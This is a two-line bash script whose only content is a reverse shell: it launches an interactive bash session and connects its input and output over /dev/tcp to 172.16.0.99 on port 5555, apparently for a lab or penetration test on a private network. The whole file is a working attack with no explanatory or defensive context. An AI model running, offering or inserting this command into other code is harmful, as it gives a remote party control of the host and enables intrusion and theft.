#!/bin/bash
bash -i >& /dev/tcp/172.16.0.99/5555 0>&1
